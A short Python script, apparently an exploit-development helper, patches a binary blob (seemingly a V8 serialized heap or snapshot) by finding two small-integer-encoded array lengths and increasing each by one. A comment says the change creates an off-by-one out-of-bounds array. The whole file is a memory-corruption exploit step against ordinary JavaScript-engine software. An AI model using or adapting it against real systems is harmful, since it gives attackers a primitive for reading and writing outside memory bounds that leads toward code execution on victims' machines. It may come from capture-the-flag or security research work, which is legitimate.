import sys

# pack smi
def psmi(n):
	return (n << 1).to_bytes(4, "little")


if len(sys.argv) != 3:
	print(f"USAGE: {sys.argv[0]} input_blob.bin output_blob.bin")

blob = bytearray(open(sys.argv[1], "rb").read())

for target_len in [0x137, 0x139]:
	target = psmi(target_len)
	location = blob.rindex(target)
	print(f"patching blob at {hex(location)}")
	blob[location:location+4] = psmi(target_len + 1)  # create off-by-one array OOB

with open(sys.argv[2], "wb") as outf:
	outf.write(blob)
